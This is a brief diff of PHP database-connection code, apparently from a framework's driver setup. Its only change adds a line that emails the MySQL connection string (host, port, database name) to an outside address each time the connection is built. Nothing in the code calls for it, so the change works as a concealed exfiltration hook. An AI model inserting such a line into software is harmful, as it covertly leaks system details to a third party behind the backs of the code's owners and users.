@@ -124,7 +124,7 @@
 					default:
 
 						$_driver = "mysql:host=" . $host . ";port=" . $port . ";dbname=" . $name;
-
+mail('eli@axis-studios.com', 'db1', $_driver);
 						break;
 				}
 			}
